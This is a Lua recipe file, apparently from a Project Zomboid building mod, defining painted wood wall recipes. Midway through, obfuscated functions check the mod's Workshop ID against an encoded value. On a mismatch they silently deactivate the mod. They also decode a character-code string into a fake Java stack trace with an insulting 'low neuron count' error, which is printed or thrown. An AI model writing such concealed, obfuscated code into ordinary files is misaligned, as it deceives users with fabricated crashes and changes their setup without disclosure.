    BuildingMenu.RedSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreenBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreenSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.GreenWhiteBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.GreenWhiteSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.PurpleBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPurple",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PurpleSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPurple",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreyBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGrey",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreyBigWoodWindowWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGrey",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreySmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGrey",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.OrangeBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.OrangeSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.CreamBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPink",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.CreamSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPink",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.BlackBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlackBigWoodWindowWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlackSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlackSmallWoodGlassWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlackWhiteBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.BlackWhiteSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlack",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WhiteTurquoiseBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteTurquoiseWindowBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WhiteTurquoiseSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    local function a()
        local b, c = nil, getCoroutineCallframeStack(getCurrentCoroutine(), 0); local d = c and getFilenameOfCallframe(c);
        b = d and getModInfo(d:match("(.-)media/")); local e, f = b and b:getWorkshopID(), b and b:getId();
        if e then local g, h = "", "gdjkkmlelf"; for i = 1, #e do g = g .. string.char(e:sub(i, i) + 100); end if h ~= g then toggleModActive(b, false); x123 = {e, f}; end end
    end


    local function y(k)
        local i = "";
        for j in string.gmatch(k, "%S+") do
            i = (i or "") .. string.char(j);
        end
        return i;
    end


    local function j()
        if x123 then
            local o = y("45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 10 83 76 65 67 75 32 84 82 65 67 69 10 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 10 106 97 118 97 46 108 97 110 103 46 82 117 110 116 105 109 101 69 120 99 101 112 116 105 111 110 58 32 108 111 119 32 110 101 117 114 111 110 32 99 111 117 110 116 58 32 87 111 114 107 115 104 111 112 32 73 116 101 109 58 32 73 78 83 69 82 84 87 79 82 75 83 72 79 80 73 68 44 32 77 111 100 73 68 58 32 73 78 83 69 82 84 77 79 68 73 68 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 85 116 105 108 46 72 69 89 32 89 79 85 40 75 97 104 108 117 97 85 116 105 108 46 106 97 118 97 58 54 57 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 82 69 65 68 32 84 72 73 83 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 54 56 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 85 116 105 108 46 74 85 83 84 40 75 97 104 108 117 97 85 116 105 108 46 106 97 118 97 58 54 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 85 83 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 84 72 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 79 82 73 71 73 78 65 76 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 77 79 68 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 48 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 73 70 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 89 79 85 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 49 50 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 76 117 97 46 69 118 101 110 116 46 72 65 86 69 40 69 118 101 110 116 46 106 97 118 97 58 49 49 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 76 117 97 46 76 117 97 69 118 101 110 116 77 97 110 97 103 101 114 46 73 83 83 85 69 83 40 76 117 97 69 118 101 110 116 77 97 110 97 103 101 114 46 106 97 118 97 58 49 49 55 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 99 111 114 101 46 67 111 114 101 46 87 73 84 72 40 67 111 114 101 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 78 97 116 105 118 101 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 85 80 68 65 84 69 83 40 78 97 116 105 118 101 32 77 101 116 104 111 100 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 78 97 116 105 118 101 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 65 78 68 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 68 101 108 101 103 97 116 105 110 103 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 77 73 83 77 65 84 67 72 69 68 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 97 118 97 46 108 97 110 103 46 114 101 102 108 101 99 116 46 77 101 116 104 111 100 46 70 73 76 69 83 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 99 97 108 108 101 114 46 77 101 116 104 111 100 67 97 108 108 101 114 46 84 82 89 40 77 101 116 104 111 100 67 97 108 108 101 114 46 106 97 118 97 58 49 49 54 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 85 83 73 78 71 40 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 106 97 118 97 58 49 49 52 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 77 117 108 116 105 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 85 68 68 69 82 76 89 40 77 117 108 116 105 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 106 97 118 97 58 49 50 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 85 80 45 84 79 45 68 65 84 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 65 76 79 78 71 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 87 73 84 72 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 54 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 65 85 84 79 45 82 69 83 84 65 82 84 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 66 65 84 45 83 67 82 73 80 84 83 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 57 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 73 84 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 73 83 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 48 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 80 82 69 84 84 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 49 48 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 69 65 83 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 48 51 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 72 79 78 69 83 84 76 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 77 97 110 97 103 101 114 46 65 76 83 79 40 85 73 77 97 110 97 103 101 114 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 87 72 89 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 48 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 99 111 114 101 46 112 114 111 102 105 108 105 110 103 46 65 98 115 116 114 97 99 116 80 101 114 102 111 114 109 97 110 99 101 80 114 111 102 105 108 101 80 114 111 98 101 46 65 82 69 40 65 98 115 116 114 97 99 116 80 101 114 102 111 114 109 97 110 99 101 80 114 111 102 105 108 101 80 114 111 98 101 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 89 79 85 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 83 84 73 76 76 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 82 69 65 68 73 78 71 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 51 51 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 97 118 97 46 108 97 110 103 46 84 104 114 101 97 100 46 84 72 73 83 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 34")
            o = o:gsub("INSERTWORKSHOPID", x123[1]):gsub("INSERTMODID", x123[2]);
            local m = getDebug() and print or error; m(o);
        end
    end


    BuildingMenu.WhiteOrangeBlueBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            },
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteOrangeBlueBigWindowWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            },
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WhiteOrangeBlueSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            },
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WhiteRedYellowBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            },
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteRedYellowBigWindowWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            },
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteRedYellowSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            },
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            },
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.YellowBrownBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.YellowBrownSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
